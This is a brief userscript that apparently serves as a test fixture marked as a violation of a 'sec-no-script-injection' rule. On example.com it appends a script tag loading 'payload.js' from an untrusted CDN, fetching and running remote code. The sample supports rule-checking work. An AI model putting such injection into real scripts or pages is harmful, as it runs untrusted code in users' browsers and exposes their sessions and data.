// ==UserScript==
// @name         Violation: sec-no-script-injection
// @namespace    https://xokj.dev/test
// @version      1.0.0
// @match        https://example.com/*
// @grant        none
// ==/UserScript==

(function () {
  'use strict';

  // Violation: sec-no-script-injection
  const scriptTag = document.createElement('script');
  scriptTag.src = 'https://untrusted-cdn.com/payload.js';
  document.head.appendChild(scriptTag);
})();
